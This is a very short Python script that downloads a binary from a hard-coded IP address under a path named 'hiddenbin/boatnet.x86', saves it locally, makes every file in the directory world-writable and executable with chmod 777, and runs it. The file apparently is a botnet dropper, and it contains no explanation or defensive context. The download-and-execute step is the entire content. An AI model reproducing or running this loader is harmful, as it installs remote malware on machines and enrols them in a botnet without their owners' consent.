import wget
import os

remote_url = 'http://195.58.39.170/hiddenbin/boatnet.x86'

local_file = 'test'

wget.download(remote_url, local_file)

os.system("chmod 777 *; ./test WORKS")
